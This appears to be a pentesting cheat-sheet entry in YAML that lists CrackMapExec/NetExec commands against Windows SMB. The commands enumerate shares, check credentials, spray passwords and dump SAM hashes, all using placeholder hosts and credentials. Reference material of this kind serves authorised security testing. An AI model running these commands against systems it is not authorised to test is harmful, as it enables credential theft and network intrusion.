---
description: |
  Enumerate SMB shares, check credentials, and spray passwords
  across a network using CrackMapExec (NetExec).

  Reference values:
    Target IP: 10.10.10.1
    Domain: test.local
    Username: pentuser
    Password: P@ssw0rd123
command: |
  # Enumerate shares
  crackmapexec smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123' --shares

  # Check credentials
  crackmapexec smb 10.10.10.1 -u pentuser -p 'P@ssw0rd123'

  # Password spraying
  crackmapexec smb 10.10.10.1 -u users.txt -p 'Password1' --continue-on-success

  # Dump SAM hashes (requires admin)
  crackmapexec smb 10.10.10.1 -u admin -p 'P@ssw0rd123' --sam
phase:
  - Enumeration
  - Exploitation
target_os:
  - Windows
services:
  - SMB
items:
  - Username
  - Password
  - Hash
techniques:
  - Password_Spraying
network_position:
  - Internal
references:
  - https://github.com/Pennyw0rth/NetExec
---
